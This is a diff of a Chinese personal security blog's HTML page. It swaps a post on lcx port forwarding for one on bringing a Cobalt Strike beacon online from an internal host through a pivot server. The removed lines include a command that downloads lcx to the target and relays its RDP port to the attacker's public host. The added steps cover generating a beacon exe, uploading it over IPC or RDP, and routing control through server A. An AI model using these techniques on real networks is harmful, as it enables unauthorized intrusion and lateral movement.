@@ -14,27 +14,30 @@
     
     
     
-    <title>lcx端口转发 | $_Fuck | 白天搞笑的废物，晚上抑郁的怪物。</title>
+    <title>目标机器不出网上线办法 | $_Fuck | 白天搞笑的废物，晚上抑郁的怪物。</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
     
     
     <meta name="keywords" content="内网渗透">
-    <meta name="description" content="简介 Lcx是一个端口的转发工具，可以将内网的端口给转发到外网的机器上，然后就可以去连接远程对方内网  简单来说就是，a机器我可以执行命令，但是我想连接他的3389，但是禁止外网连接，那么我们可以用lcx来把3389端口的流量，转发到我们机器(必须外网可以访问过来)的其他端口，比如5555端口，然后连接只要连接127.0.0.1:5555就可以连接a机器的3389了。 用法把lcx上传到目标服务器">
+    <meta name="description" content="网络环境 上线办法1、设置中转监听 点击服务器A会话   1Name：备注名2Payload：就图中这个3Listen Host：服务器A的内网IP4Listen Port：监听端口  2、生成exe上线马  3、利用ipc连接上传文件或直接3389连接拖进去 4、打开文件 5、上线成功   上线原理服务器B通过服务器A来连接我们的攻击机，然后我们执行服务器B的操作会先经过服务器A，然后由服务器A">
 <meta name="keywords" content="内网渗透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lcx端口转发">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;22&#x2F;lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91&#x2F;index.html">
+<meta property="og:title" content="目标机器不出网上线办法">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;03&#x2F;%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95&#x2F;index.html">
 <meta property="og:site_name" content="$_Fuck">
-<meta property="og:description" content="简介 Lcx是一个端口的转发工具，可以将内网的端口给转发到外网的机器上，然后就可以去连接远程对方内网  简单来说就是，a机器我可以执行命令，但是我想连接他的3389，但是禁止外网连接，那么我们可以用lcx来把3389端口的流量，转发到我们机器(必须外网可以访问过来)的其他端口，比如5555端口，然后连接只要连接127.0.0.1:5555就可以连接a机器的3389了。 用法把lcx上传到目标服务器">
+<meta property="og:description" content="网络环境 上线办法1、设置中转监听 点击服务器A会话   1Name：备注名2Payload：就图中这个3Listen Host：服务器A的内网IP4Listen Port：监听端口  2、生成exe上线马  3、利用ipc连接上传文件或直接3389连接拖进去 4、打开文件 5、上线成功   上线原理服务器B通过服务器A来连接我们的攻击机，然后我们执行服务器B的操作会先经过服务器A，然后由服务器A">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;0wu0cgdcgmgs3wb737h7gx78&#x2F;image.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;g51kx1hkhpjgg668vara7vwu&#x2F;image.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;wi4i3149atyepl1fcz4l921o&#x2F;image.png">
-<meta property="og:updated_time" content="2019-12-21T18:17:25.287Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;zkqlgw3w6102uhg85fb6alp6&#x2F;image_1e03au6485c51kv6f9d1kd1s3f9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;l8s0is4l7v0p92tv11i9qblm&#x2F;image_1e03e2kebicn3fr1e0o1t4ljop9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;u5acix71lj8501kui7zuljvt&#x2F;image_1e03h3ul114abfi3em318nakp39.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;f1avz3j671b3d4qy328rzk5y&#x2F;image_1e03ed7pte4kgbb1cvpv7t51p13.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;1qkctpmcston21x9vgtvuahe&#x2F;image_1e03h6dng1t7gbtb106s1mgi2ctm.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;h0wcjn7cx8kagks3fxag7zm3&#x2F;image_1e03h71ci14pd1879kr1b6vgk913.png">
+<meta property="og:updated_time" content="2020-02-02T18:07:12.249Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;0wu0cgdcgmgs3wb737h7gx78&#x2F;image.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;static.zybuluo.com&#x2F;1kbfree&#x2F;zkqlgw3w6102uhg85fb6alp6&#x2F;image_1e03au6485c51kv6f9d1kd1s3f9.png">
     
     <link rel="shortcut icon" href="/favicon.ico">
     <link rel="stylesheet" href="/css/style.css?v=1.7.2">
@@ -120,7 +123,7 @@
         <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
-        <div class="flex-col header-title ellipsis">lcx端口转发</div>
+        <div class="flex-col header-title ellipsis">目标机器不出网上线办法</div>
         
         <div class="search-wrap" id="search-wrap">
             <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
@@ -142,11 +145,11 @@
 <header class="content-header post-header">
 
     <div class="container fade-scale">
-        <h1 class="title">lcx端口转发</h1>
+        <h1 class="title">目标机器不出网上线办法</h1>
         <h5 class="subtitle">
             
-                <time datetime="2019-12-21T18:10:35.000Z" itemprop="datePublished" class="page-time">
-  2019-12-22
+                <time datetime="2020-02-02T18:05:07.000Z" itemprop="datePublished" class="page-time">
+  2020-02-03
 </time>
 
 
@@ -167,18 +170,18 @@
     <aside class="post-widget">
         <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
             <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#用法"><span class="post-toc-number">2.</span> <span class="post-toc-text">用法</span></a></li></ol>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#网络环境"><span class="post-toc-number">1.</span> <span class="post-toc-text">网络环境</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上线办法"><span class="post-toc-number">2.</span> <span class="post-toc-text">上线办法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#上线原理"><span class="post-toc-number">3.</span> <span class="post-toc-text">上线原理</span></a></li></ol>
         </nav>
     </aside>
 
 
-<article id="post-lcx端口转发"
+<article id="post-目标机器不出网上线办法"
   class="post-article article-type-post fade" itemprop="blogPost">
 
     <div class="post-card">
-        <h1 class="post-card-title">lcx端口转发</h1>
+        <h1 class="post-card-title">目标机器不出网上线办法</h1>
         <div class="post-meta">
-            <time class="post-time" title="2019-12-22 02:10:35" datetime="2019-12-21T18:10:35.000Z"  itemprop="datePublished">2019-12-22</time>
+            <time class="post-time" title="2020-02-03 02:05:07" datetime="2020-02-02T18:05:07.000Z"  itemprop="datePublished">2020-02-03</time>
 
             
 	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/">兴趣爱好</a></li></ul>
@@ -193,24 +196,21 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p><code>Lcx</code>是一个端口的转发工具，可以将内网的端口给转发到外网的机器上，然后就可以去连接远程对方内网</p>
-</blockquote>
-<p>简单来说就是，<code>a</code>机器我可以执行命令，但是我想连接他的<code>3389</code>，但是禁止外网连接，那么我们可以用<code>lcx</code>来把<code>3389</code>端口的流量，转发到我们机器(<strong>必须外网可以访问过来</strong>)的其他端口，比如<code>5555</code>端口，然后连接只要连接<code>127.0.0.1:5555</code>就可以连接<code>a</code>机器的<code>3389</code>了。</p>
-<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>把<code>lcx</code>上传到目标服务器（比如我们可以把<code>lcx.exe</code>上传到<code>www.xxx.com</code>地址，然后<code>lcx.exe</code>就变成了<code>www.xxx.com/lcx.exe</code>，然后在目标机器上执行<code>wget</code>讲起下载到目标服务器）</p>
-<p>然后执行如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">本机：lcx.exe -listen 51 33891    注意：本机必须要外网服务器，就是别人可以访问你的&#96;ip&#96;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">目标服务器:lcx.exe -slave 公网ip 51 目标服务器ip 3389</span></pre></td></tr></table></figure>
+            <h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p><img src="http://static.zybuluo.com/1kbfree/zkqlgw3w6102uhg85fb6alp6/image_1e03au6485c51kv6f9d1kd1s3f9.png" alt="image_1e03au6485c51kv6f9d1kd1s3f9.png-24.8kB"></p>
+<h2 id="上线办法"><a href="#上线办法" class="headerlink" title="上线办法"></a>上线办法</h2><p>1、设置中转监听</p>
+<p>点击服务器<code>A</code>会话</p>
+<p><img src="http://static.zybuluo.com/1kbfree/l8s0is4l7v0p92tv11i9qblm/image_1e03e2kebicn3fr1e0o1t4ljop9.png" alt="image_1e03e2kebicn3fr1e0o1t4ljop9.png-24.6kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/u5acix71lj8501kui7zuljvt/image_1e03h3ul114abfi3em318nakp39.png" alt="image_1e03h3ul114abfi3em318nakp39.png-143.3kB"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Name：备注名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Payload：就图中这个</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Listen Host：服务器A的内网IP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Listen Port：监听端口</span></pre></td></tr></table></figure>
 
-<p>本机执行的命令意思为：</p>
-<p>利用<code>lcx.exe</code>监听本地<code>51</code>端口，然后讲起转到<code>33891</code>端口</p>
-<p>目标服务器执行的命令为：</p>
-<p>利用<code>lcx.exe</code>去连接本机<code>ip</code>的<code>51</code>端口，并且将目标服务器的<code>3389</code>端口转发给他</p>
-<p>攻击机：</p>
-<p><img src="http://static.zybuluo.com/1kbfree/0wu0cgdcgmgs3wb737h7gx78/image.png" alt="image.png-23.7kB"></p>
-<p>受害机：</p>
-<p><img src="http://static.zybuluo.com/1kbfree/g51kx1hkhpjgg668vara7vwu/image.png" alt="image.png-24.2kB"></p>
-<p>然后直接连接攻击机的<code>33891</code>端口即可</p>
-<p><img src="http://static.zybuluo.com/1kbfree/wi4i3149atyepl1fcz4l921o/image.png" alt="image.png-23.6kB"></p>
+<p>2、生成<code>exe</code>上线马</p>
+<p><img src="http://static.zybuluo.com/1kbfree/f1avz3j671b3d4qy328rzk5y/image_1e03ed7pte4kgbb1cvpv7t51p13.png" alt="image_1e03ed7pte4kgbb1cvpv7t51p13.png-40.2kB"></p>
+<p>3、利用<code>ipc</code>连接上传文件或直接<code>3389</code>连接拖进去</p>
+<p>4、打开文件</p>
+<p>5、上线成功</p>
+<p><img src="http://static.zybuluo.com/1kbfree/1qkctpmcston21x9vgtvuahe/image_1e03h6dng1t7gbtb106s1mgi2ctm.png" alt="image_1e03h6dng1t7gbtb106s1mgi2ctm.png-76.8kB"></p>
+<p><img src="http://static.zybuluo.com/1kbfree/h0wcjn7cx8kagks3fxag7zm3/image_1e03h71ci14pd1879kr1b6vgk913.png" alt="image_1e03h71ci14pd1879kr1b6vgk913.png-10.9kB"></p>
+<h2 id="上线原理"><a href="#上线原理" class="headerlink" title="上线原理"></a>上线原理</h2><p>服务器<code>B</code>通过服务器<code>A</code>来连接我们的攻击机，然后我们执行服务器<code>B</code>的操作会先经过服务器<code>A</code>，然后由服务器<code>A</code>回显到攻击机/<code>Cs</code></p>
 
         </div>
 
@@ -219,12 +219,12 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-12-21T18:17:25.287Z" itemprop="dateUpdated">2019-12-22 02:17:25</time>
+    最后更新时间：<time datetime="2020-02-02T18:07:12.249Z" itemprop="dateUpdated">2020-02-03 02:07:12</time>
 </span><br>
 
 
         
-        未经允许，禁止转载：<a href="/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_blank" rel="external">http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a>
+        未经允许，禁止转载：<a href="/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" target="_blank" rel="external">http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</a>
         
     </div>
     
@@ -255,7 +255,7 @@
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&title=《lcx端口转发》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&title=《目标机器不出网上线办法》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -265,22 +265,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&title=《lcx端口转发》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&title=《目标机器不出网上线办法》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《lcx端口转发》 — $_Fuck&url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《目标机器不出网上线办法》 — $_Fuck&url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&via=http://yoursite.com" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -300,21 +300,14 @@
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/12/23/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%86%99%E5%85%A5webshell%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E5%BB%BA%E8%AE%AE/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">redis漏洞复现写入webshell以及删除建议</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="waves-block waves-effect next">
-      <a href="/2019/12/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" id="post-next" class="post-nav-link">
+      <a href="/2020/02/02/ATT/" id="post-next" class="post-nav-link">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">从0开始学内网渗透资料</h4>
+        <h4 class="title">Vlunstack ATT&amp;CK实战系列一</h4>
       </a>
     </div>
   
@@ -385,7 +378,7 @@
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&title=《lcx端口转发》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&title=《目标机器不出网上线办法》 — $_Fuck&pic=http://yoursite.com/img/blog.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -395,22 +388,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&title=《lcx端口转发》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&title=《目标机器不出网上线办法》 — $_Fuck&source=无助就算了，还要假装坚强。" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《lcx端口转发》 — $_Fuck&url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《目标机器不出网上线办法》 — $_Fuck&url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/&via=http://yoursite.com" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -421,7 +414,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" alt="微信分享二维码">
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" alt="微信分享二维码">
 </div>
 
 
